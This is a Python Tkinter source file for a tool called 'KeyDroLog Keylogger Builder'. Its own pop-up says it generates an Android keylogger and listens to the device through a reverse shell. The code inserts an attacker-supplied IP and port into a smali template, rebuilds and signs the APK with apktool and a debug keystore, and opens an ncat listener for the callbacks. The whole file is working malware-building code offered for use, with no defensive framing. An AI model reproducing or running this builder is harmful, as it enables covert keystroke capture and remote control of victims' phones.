import os, sys, time, fileinput
from os import path, kill, mkdir
from getpass import getpass
import re
import tkinter as tk
from tkinter import messagebox
from tkterminal import Terminal

messagebox.showinfo("Info", "this tool generate android keylogger and listen device with reverse shell\nFollow me at https://github.com/bruskofgod")

def start():
    ip_port = ip_entry.get() + ":" + port_entry.get()
    os.system("sed -i 's/ip_port/"+ip_port+"/' keylogger/smali/com/keylogger/MainActivity.smali")
    os.system("java -jar apktool.jar b keylogger")
    os.system("java -jar ubersigner.jar -a keylogger/dist/keylogger.apk --ks debug.jks --ksAlias debugging --ksPass debugging --ksKeyPass debugging > /dev/null 2>&1")
    os.system("java -jar ubersigner.jar -a keylogger.apk --onlyVerify > /dev/null 2>&1")
    time.sleep(2)
    os.system("rm keylogger/smali/com/keylogger/MainActivity.smali")
    os.system("cp MainActivity.smali keylogger/smali/com/keylogger/")
    os.system("rm -rf keylogger/dist/keylogger.apk")
    time.sleep(1)
    messagebox.showinfo("Info", "keylogger.apk created and signed")
    os.system("xdg-open ./keylogger/dist")
    
    
def listen():
    root = tk.Tk()
    terminal = Terminal(pady=10, padx=1, background= 'black', selectbackground='green')
    terminal.shell = True
    terminal.linebar = True
    terminal.pack(expand=True, fill='both')
    b1 = tk.Button(
    root, text="Listen Device", fg="Black",
    command=lambda: terminal.run_command('ncat -klvnp' +port_entry.get() , 'y'))
    b1.pack()
    root.mainloop()


def exit_app():
    root.destroy()


    
root = tk.Tk()
root.geometry("400x500")
root.title("KeyDroLog Keylogger Builder")

label_ip = tk.Label(root, text="Please enter IP:PORT (e.g. 192.168.1.16:4444):", font=("TkDefaultFont", 12))
label_ip.pack(fill="both", expand=True, padx=10, pady=10)

ip_entry = tk.Entry(root, font=("TkDefaultFont", 15))
ip_entry.pack(fill="both", expand=True, padx=10, pady=10)

port_entry = tk.Entry(root, font=("TkDefaultFont", 15))
port_entry.pack(fill="both", expand=True, padx=10, pady=10)

button = tk.Button(root, text="Build", font=("TkDefaultFont", 15), command=start)
button.pack(fill="both", expand=True, padx=10, pady=10)

listen_button = tk.Button(root, text="Listen", font=("TkDefaultFont", 15), command=listen)
listen_button.pack(fill="both", expand=True, padx=10, pady=10)



exit_button = tk.Button(root, text="Exit", font=("TkDefaultFont", 15), command=exit_app)
exit_button.pack(fill="both", expand=True, padx=10, pady=10)


root.mainloop()
